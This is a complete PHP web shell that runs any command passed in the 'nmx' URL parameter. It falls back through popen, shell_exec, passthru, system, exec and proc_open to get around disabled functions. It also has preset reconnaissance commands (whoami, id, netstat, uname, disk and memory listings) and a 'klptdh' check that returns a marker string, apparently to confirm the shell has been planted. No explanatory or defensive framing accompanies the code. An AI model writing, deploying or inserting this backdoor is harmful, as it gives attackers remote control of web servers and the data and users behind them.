<?php
header('Content-Type: text/plain; charset=utf-8');

$nmx = isset($_GET['nmx']) ? trim((string)$_GET['nmx']) : '';

if (empty($nmx)) {
    die("Usage: ?nmx=[info|network|specs|any_command]");
}

$is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

function execute_power($cmd) {
    if (empty($cmd)) return '';

    if (function_exists('popen') && function_exists('fread')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }

    if (function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    }

    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }

    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    }

    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $out);
        return implode("\n", $out);
    }

    if (function_exists('proc_open')) {
        $descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            return $output;
        }
    }

    return "Error: All execution functions are disabled.";
}

switch ($nmx) {
    case 'info':
        echo execute_power($is_windows ? 'whoami && echo Current Dir: && cd' : 'whoami && echo "Current Dir:" && pwd && id');
        break;

    case 'network':
        echo execute_power($is_windows ? 'netstat -an' : 'netstat -tuln || ss -tuln || route -n');
        break;

    case 'specs':
        echo execute_power($is_windows ? 'wmic os get Caption,Version,OSArchitecture && wmic logicaldisk get size,freespace,caption' : 'uname -a && lscpu | grep "Model name" && df -h && free -m');
        break;
    
    case 'klptdh':
        echo "KLPTeduh_OK"; 
        break;

    default:
        echo htmlspecialchars(execute_power($nmx));
        break;
}
?>
